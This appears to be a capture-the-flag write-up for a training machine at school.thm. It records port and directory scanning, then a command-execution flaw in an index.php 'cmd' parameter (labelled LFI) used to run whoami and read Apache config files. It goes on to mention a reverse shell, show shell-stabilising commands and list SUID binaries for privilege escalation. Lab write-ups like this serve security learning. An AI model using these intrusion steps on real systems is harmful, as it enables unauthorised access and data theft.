# U.A. Highschool CTF

## Recon
1. nmap -sS -oN nmap_initial.txt gives us open ssh and http ports. Lets get detail on the http port 
2. nmap -A -p80 -oN nmap_http.txt school.thm we have an apache web server running lets go ahead and look at the website
3. The webiste has a few forms but non seem functional there doesn't seem to be anything interesting in the sorce code.
4. gobuster dir -u http://school.thm -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50 reveals only /assets and /server-status
5. Wild goose chase with Japanese word lists
6. the hint says be suspicous of any unused files lets look for files; we find an index.php
7. we have found LFI on index.php

## LFI Exploration

1. http://school.thm/assets/index.php?cmd=whoami gives us d3d3LWRhdGEK
2. base 64 decode shows user is www-data
3. http://school.thm/assets/index.php?cmd=cat /etc/apache2/sites-enabled/000-default.conf reveals some info see apache_conf.txt
4. we are able to reverse shell

## Reverse Shell

1. stabalize with: python3 -c 'import pty; pty.spawn("/bin/bash")'
2. make terminal responsive export TERM=xterm
3. improve input handling: stty raw -echo; fg
4. www-data@myheroacademia:/var/www/html/assets$ whoami && hostname
www-data
myheroacademia
5. www-data@myheroacademia:/var/www/html/assets$ uname -a
Linux myheroacademia 5.4.0-153-generic #170-Ubuntu SMP Fri Jun 16 13:43:31 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
6. www-data@myheroacademia:/var/www/html/assets$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
7. www-data@myheroacademia:/var/www/html/assets$ df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  4.7G  4.7G  51% /
udev                               436M     0  436M   0% /dev
tmpfs                              481M     0  481M   0% /dev/shm
tmpfs                               97M  944K   96M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              481M     0  481M   0% /sys/fs/cgroup
/dev/loop0                          64M   64M     0 100% /snap/core20/1828
/dev/loop1                          50M   50M     0 100% /snap/snapd/18357
/dev/loop2                          92M   92M     0 100% /snap/lxd/24061
/dev/xvda2                         1.7G  108M  1.5G   7% /boot
8. /usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/umount
/usr/bin/at
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/snap/core20/1828/usr/bin/chfn
/snap/core20/1828/usr/bin/chsh
/snap/core20/1828/usr/bin/gpasswd
/snap/core20/1828/usr/bin/mount
/snap/core20/1828/usr/bin/newgrp
/snap/core20/1828/usr/bin/passwd
/snap/core20/1828/usr/bin/su
/snap/core20/1828/usr/bin/sudo
/snap/core20/1828/usr/bin/umount
/snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1828/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine

